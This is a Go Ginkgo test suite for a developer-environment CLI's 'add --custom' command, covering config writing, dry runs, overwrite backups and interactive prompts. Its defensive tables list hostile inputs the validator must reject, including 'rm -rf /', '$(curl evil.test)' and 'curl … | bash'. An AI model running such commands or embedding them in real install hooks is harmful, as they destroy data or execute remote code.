package commands

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	"github.com/spf13/viper"

	"github.com/jameswlane/devex/apps/cli/internal/config"
	"github.com/jameswlane/devex/apps/cli/internal/mocks"
	"github.com/jameswlane/devex/apps/cli/internal/types"
)

// None of these specs install anything: add --custom only writes configuration,
// and the specs run it against a temporary HOME.
var _ = Describe("Add custom applications", func() {
	var settings config.CrossPlatformSettings
	var output, diagnostics bytes.Buffer
	var stdin string

	BeforeEach(func() {
		viper.Reset()
		DeferCleanup(viper.Reset)
		home := GinkgoT().TempDir()
		GinkgoT().Setenv("HOME", home)
		GinkgoT().Setenv("DEVEX_TEAM_CONFIG_DIR", "")
		GinkgoT().Setenv("DEVEX_ENV", "dev")
		GinkgoT().Setenv("CI", "true") // unattended unless a spec opts in
		settings = config.CrossPlatformSettings{HomeDir: home}
		output.Reset()
		diagnostics.Reset()
		stdin = ""
	})
	interactive := func() {
		GinkgoT().Setenv("CI", "")
		GinkgoT().Setenv("GITHUB_ACTIONS", "")
		GinkgoT().Setenv("GITLAB_CI", "")
		GinkgoT().Setenv("TERM", "xterm")
	}
	execute := func(args ...string) error {
		cmd := NewAddCmd(mocks.NewMockRepository(), settings)
		cmd.SetOut(&output)
		cmd.SetErr(&diagnostics)
		cmd.SetIn(strings.NewReader(stdin))
		cmd.SetArgs(args)
		return cmd.Execute()
	}
	unchanged := func() {
		entries, err := os.ReadDir(settings.HomeDir)
		Expect(err).NotTo(HaveOccurred())
		Expect(entries).To(BeEmpty())
	}
	toolPath := func() string {
		path, err := applicationConfigPath(settings.GetConfigDir(), "applications", "development", "mytool")
		Expect(err).NotTo(HaveOccurred())
		return path
	}
	baseArgs := []string{"mytool", "--custom", "--linux-method", "apt", "--linux-package", "mytool"}
	with := func(extra ...string) []string { return append(append([]string{}, baseArgs...), extra...) }

	It("round-trips an unknown tool with a complete cross-platform definition", func() {
		Expect(execute("mytool", "--custom", "--description", "Internal tool", "--category", "development",
			"--linux-method", "apt", "--linux-package", "mytool", "--linux-pre-install", "mkdir -p $HOME/.mytool", "--linux-post-install", "mytool --version",
			"--macos-method", "brew", "--macos-package", "acme/tap/mytool",
			"--windows-method", "mise", "--windows-package", "mytool", "--yes")).To(Succeed())

		apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
		Expect(err).NotTo(HaveOccurred())
		Expect(apps).To(HaveLen(1))
		app := apps[0]
		Expect(app.Name).To(Equal("mytool"))
		Expect(app.Description).To(Equal("Internal tool"))
		Expect(app.Category).To(Equal("development"))
		Expect(app.Linux.InstallMethod).To(Equal("apt"))
		Expect(app.Linux.InstallCommand).To(Equal("mytool"))
		Expect(app.Linux.UninstallCommand).To(Equal("mytool"))
		Expect(app.Linux.PreInstall).To(Equal([]types.InstallCommand{{Shell: "mkdir -p $HOME/.mytool"}}))
		Expect(app.Linux.PostInstall).To(Equal([]types.InstallCommand{{Shell: "mytool --version"}}))
		Expect(app.MacOS.InstallMethod).To(Equal("brew"))
		Expect(app.MacOS.InstallCommand).To(Equal("acme/tap/mytool"))
		Expect(app.MacOS.UninstallCommand).To(Equal("mytool"))
		Expect(app.Windows.InstallMethod).To(Equal("mise"))
		Expect(app.AllPlatforms.InstallMethod).To(BeEmpty())
		Expect(output.String()).To(ContainSubstring("Added: mytool"))

		result, err := config.ValidateConfig(context.Background(), settings, false)
		Expect(err).NotTo(HaveOccurred())
		Expect(result.Valid).To(BeTrue(), "%+v", result.Diagnostics)
	})

	It("supports all_platforms definitions", func() {
		Expect(execute("tool", "--custom", "--all-method", "mise", "--all-package", "tool@1.2", "--yes")).To(Succeed())
		apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
		Expect(err).NotTo(HaveOccurred())
		Expect(apps).To(ConsistOf(HaveField("AllPlatforms.InstallCommand", "tool@1.2")))
	})

	It("rejects all_platforms methods that do not run on every platform", func() {
		err := execute("tool", "--custom", "--all-method", "apt", "--all-package", "tool", "--yes")
		Expect(err).To(MatchError(And(ContainSubstring(`"apt" is not available on this platform`), ContainSubstring("mise"), Not(ContainSubstring("brew")))))
		unchanged()
	})

	It("shows the YAML on dry run and writes nothing", func() {
		Expect(execute(with("--dry-run", "--linux-post-install", "mytool --version")...)).To(Succeed())
		Expect(output.String()).To(And(ContainSubstring("name: mytool"), ContainSubstring("install_method: apt"), ContainSubstring("shell: mytool --version"), ContainSubstring("Would add: mytool")))
		unchanged()
	})

	It("emits the preview in JSON without persisting dry runs", func() {
		Expect(execute(with("--dry-run", "--format=json")...)).To(Succeed())
		var result struct {
			Added  []string `json:"added"`
			DryRun bool     `json:"dry_run"`
			YAML   string   `json:"yaml"`
		}
		Expect(json.Unmarshal(output.Bytes(), &result)).To(Succeed())
		Expect(result.Added).To(Equal([]string{"mytool"}))
		Expect(result.DryRun).To(BeTrue())
		Expect(result.YAML).To(ContainSubstring("install_command: mytool"))
		unchanged()
	})

	It("requires --yes when unattended", func() {
		Expect(execute(with()...)).To(MatchError(ContainSubstring("--yes")))
		unchanged()
	})

	It("requires a name when unattended", func() {
		Expect(execute("--custom", "--linux-method", "apt", "--linux-package", "x", "--yes")).To(MatchError(ContainSubstring("application name")))
		unchanged()
	})

	It("requires at least one platform", func() {
		Expect(execute("mytool", "--custom", "--yes")).To(MatchError(ContainSubstring("at least one platform")))
		unchanged()
	})

	It("reports a method without a package", func() {
		Expect(execute("mytool", "--custom", "--linux-method", "apt", "--yes")).To(MatchError(ContainSubstring("package identifier is required")))
		unchanged()
	})

	It("rejects definition flags without --custom", func() {
		Expect(execute("git", "--linux-method", "apt")).To(MatchError(ContainSubstring("only apply with --custom")))
		Expect(execute("git", "--force")).To(MatchError(ContainSubstring("only apply with --custom")))
		unchanged()
	})

	DescribeTable("rejects methods that no installer plugin handles",
		func(platformFlag, method, expected, listed string) {
			err := execute("mytool", "--custom", "--"+platformFlag+"-method", method, "--"+platformFlag+"-package", "mytool", "--yes")
			Expect(err).To(MatchError(And(ContainSubstring(expected), ContainSubstring("supported methods: "), ContainSubstring(listed))))
			unchanged()
		},
		Entry("typo", "linux", "aptt", "unknown install method", "apt"),
		Entry("planned but without a plugin", "windows", "winget", "planned but has no plugin", "mise"),
		Entry("plugin for another platform", "macos", "pacman", "not available on this platform", "brew"),
		Entry("download methods need verification", "linux", "curlpipe", "checksum verification", "apt"),
	)

	DescribeTable("keeps package identifiers from becoming shell or argument text",
		func(pkg string) {
			err := execute("mytool", "--custom", "--linux-method", "apt", "--linux-package", pkg, "--yes")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("package identifier"))
			unchanged()
		},
		Entry("command separator", "mytool; rm -rf ~"),
		Entry("extra argument", "mytool --allow-unauthenticated"),
		Entry("leading option", "-y"),
		Entry("substitution", "$(curl evil.test)"),
		Entry("pipe", "a|b"),
		Entry("newline", "a\nb"),
	)

	DescribeTable("rejects hooks the install policy would refuse",
		func(flag, script, expected string) {
			err := execute(with("--"+flag, script, "--yes")...)
			Expect(err).To(MatchError(ContainSubstring(expected)))
			unchanged()
		},
		Entry("destructive command", "linux-pre-install", "echo ok; rm -rf /", "rejected by the command policy"),
		Entry("pipe to shell", "linux-post-install", "curl https://example.test/i.sh | bash", "rejected by the command policy"),
		Entry("raw rc append", "linux-post-install", "echo 'x' >> ~/.bashrc", "raw shell rc appends"),
		Entry("blank hook", "linux-post-install", "   ", "hook command is empty"),
	)

	It("keeps hooks and package identifiers in separate fields", func() {
		Expect(execute(with("--linux-pre-install", "echo before", "--yes")...)).To(Succeed())
		data, err := os.ReadFile(toolPath())
		Expect(err).NotTo(HaveOccurred())
		Expect(string(data)).To(And(ContainSubstring("install_command: mytool\n"), ContainSubstring("shell: echo before")))
	})

	It("rejects invalid names and categories", func() {
		Expect(execute("../evil", "--custom", "--linux-method", "apt", "--linux-package", "x", "--yes")).To(MatchError(ContainSubstring("application name")))
		Expect(execute(with("--category", "///", "--yes")...)).To(MatchError(ContainSubstring("category")))
		unchanged()
	})

	Context("when a definition already exists", func() {
		var original []byte
		BeforeEach(func() {
			Expect(execute(with("--description", "original", "--yes")...)).To(Succeed())
			var err error
			original, err = os.ReadFile(toolPath())
			Expect(err).NotTo(HaveOccurred())
			output.Reset()
		})

		It("refuses to overwrite it without --force", func() {
			Expect(execute("mytool", "--custom", "--description", "other", "--linux-method", "snap", "--linux-package", "mytool", "--yes")).To(MatchError(ContainSubstring("--force")))
			Expect(os.ReadFile(toolPath())).To(Equal(original))
		})

		It("refuses a dry run that would clobber it", func() {
			Expect(execute(with("--dry-run")...)).To(MatchError(ContainSubstring("already in your configuration")))
		})

		It("replaces it with --force after backing up the previous definition", func() {
			Expect(execute("mytool", "--custom", "--force", "--description", "replaced", "--linux-method", "snap", "--linux-package", "mytool-snap", "--yes")).To(Succeed())
			Expect(output.String()).To(ContainSubstring("Replaced: mytool"))
			apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
			Expect(err).NotTo(HaveOccurred())
			Expect(apps).To(HaveLen(1))
			Expect(apps[0].Description).To(Equal("replaced"))
			Expect(apps[0].Linux.InstallMethod).To(Equal("snap"))
			Expect(apps[0].Linux.InstallCommand).To(Equal("mytool-snap"))

			backups, err := filepath.Glob(filepath.Join(filepath.Dir(settings.GetConfigDir()), "backups", "*", "config.tar.gz"))
			Expect(err).NotTo(HaveOccurred())
			Expect(backups).NotTo(BeEmpty())
			found := false
			for _, backup := range backups {
				file, err := os.Open(backup)
				Expect(err).NotTo(HaveOccurred())
				compressed, err := gzip.NewReader(file)
				Expect(err).NotTo(HaveOccurred())
				archive := tar.NewReader(compressed)
				for {
					header, err := archive.Next()
					if err == io.EOF {
						break
					}
					Expect(err).NotTo(HaveOccurred())
					if strings.HasSuffix(header.Name, "mytool.yaml") {
						data, err := io.ReadAll(archive)
						Expect(err).NotTo(HaveOccurred())
						found = found || bytes.Equal(data, original)
					}
				}
				file.Close()
			}
			Expect(found).To(BeTrue(), "a backup should hold the previous definition")
		})

		It("moves the definition when --force changes its category", func() {
			Expect(execute("mytool", "--custom", "--force", "--category", "databases", "--linux-method", "apt", "--linux-package", "mytool", "--yes")).To(Succeed())
			Expect(toolPath()).NotTo(BeAnExistingFile())
			apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
			Expect(err).NotTo(HaveOccurred())
			Expect(apps).To(ConsistOf(HaveField("Category", "databases")))
		})

		It("leaves it untouched when the replacement is invalid", func() {
			Expect(execute("mytool", "--custom", "--force", "--linux-method", "nope", "--linux-package", "mytool", "--yes")).To(MatchError(ContainSubstring("unknown install method")))
			Expect(os.ReadFile(toolPath())).To(Equal(original))
		})
	})

	It("refuses to shadow a catalog application without --force", func() {
		settings.ApplicationOverrides = []types.CrossPlatformApp{{Name: "git", Description: "Git", Category: "development", Linux: types.OSConfig{InstallMethod: "apt", InstallCommand: "git"}}}
		Expect(execute("git", "--custom", "--linux-method", "apt", "--linux-package", "git", "--yes")).To(MatchError(ContainSubstring("already exists in the catalog")))
		unchanged()
		Expect(execute("git", "--custom", "--force", "--linux-method", "apt", "--linux-package", "git-custom", "--yes")).To(Succeed())
		apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
		Expect(err).NotTo(HaveOccurred())
		Expect(apps).To(ConsistOf(HaveField("Linux.InstallCommand", "git-custom")))
	})

	It("refuses a different name that maps to an existing file", func() {
		Expect(execute(with("--yes")...)).To(Succeed())
		Expect(execute("MyTool", "--custom", "--force", "--linux-method", "apt", "--linux-package", "x", "--yes")).To(Succeed())
		Expect(execute("my.tool", "--custom", "--linux-method", "apt", "--linux-package", "y", "--yes")).To(Succeed())
		Expect(execute("my-tool", "--custom", "--linux-method", "apt", "--linux-package", "z", "--yes")).To(MatchError(ContainSubstring("already exists")))
	})

	Context("with a terminal attached", func() {
		BeforeEach(interactive)

		It("prompts for missing fields and writes after confirmation", func() {
			// name, description, category, platforms, method, package, pre, post, confirm
			stdin = "mytool\nA helpful tool\n\nlinux\napt\nmytool\n\nmytool --version\ny\n"
			Expect(execute("--custom")).To(Succeed())
			apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
			Expect(err).NotTo(HaveOccurred())
			Expect(apps).To(HaveLen(1))
			Expect(apps[0].Name).To(Equal("mytool"))
			Expect(apps[0].Description).To(Equal("A helpful tool"))
			Expect(apps[0].Category).To(Equal("development"))
			Expect(apps[0].Linux.PostInstall).To(Equal([]types.InstallCommand{{Shell: "mytool --version"}}))
			Expect(diagnostics.String()).To(ContainSubstring("Configuration preview"))
		})

		It("only prompts for what flags left out", func() {
			// description, category, macos package, macos pre, macos post, confirm
			stdin = "tool desc\n\nmytool\n\n\ny\n"
			Expect(execute("mytool", "--custom", "--linux-method", "apt", "--linux-package", "mytool", "--macos-method", "brew")).To(Succeed())
			apps, err := config.LoadApplicationConfigs(settings.GetConfigDir())
			Expect(err).NotTo(HaveOccurred())
			Expect(apps).To(ConsistOf(And(HaveField("Description", "tool desc"), HaveField("MacOS.InstallCommand", "mytool"), HaveField("Linux.InstallCommand", "mytool"))))
		})

		It("re-asks after an unsupported method and lists the choices", func() {
			stdin = "d\n\nlinux\nwinget\napt\nmytool\n\n\ny\n"
			Expect(execute("mytool", "--custom")).To(Succeed())
			Expect(diagnostics.String()).To(And(ContainSubstring("planned but has no plugin"), ContainSubstring("supported methods")))
		})

		It("gives up after repeated invalid answers", func() {
			stdin = "d\n\nlinux\nbad\nbad\nbad\n"
			Expect(execute("mytool", "--custom")).To(MatchError(ContainSubstring("unknown install method")))
			unchanged()
		})

		It("leaves configuration alone when the preview is declined", func() {
			stdin = "n\n"
			Expect(execute(with("--description", "d", "--category", "development")...)).To(MatchError(ContainSubstring("cancelled")))
			unchanged()
		})

		It("fails cleanly when input ends early", func() {
			stdin = ""
			Expect(execute("--custom")).To(HaveOccurred())
			unchanged()
		})
	})

	It("lists plugin-backed methods per platform", func() {
		Expect(config.SupportedInstallMethods("macos")).To(ContainElements("brew", "mise"))
		Expect(config.SupportedInstallMethods("macos")).NotTo(ContainElement("apt"))
		Expect(config.SupportedInstallMethods("linux")).To(ContainElement("apt"))
		Expect(config.SupportedInstallMethods("")).To(ContainElements("apt", "brew"))
		Expect(config.InstallMethodSupportsPlatform("winget", "windows")).To(BeFalse())
	})
})
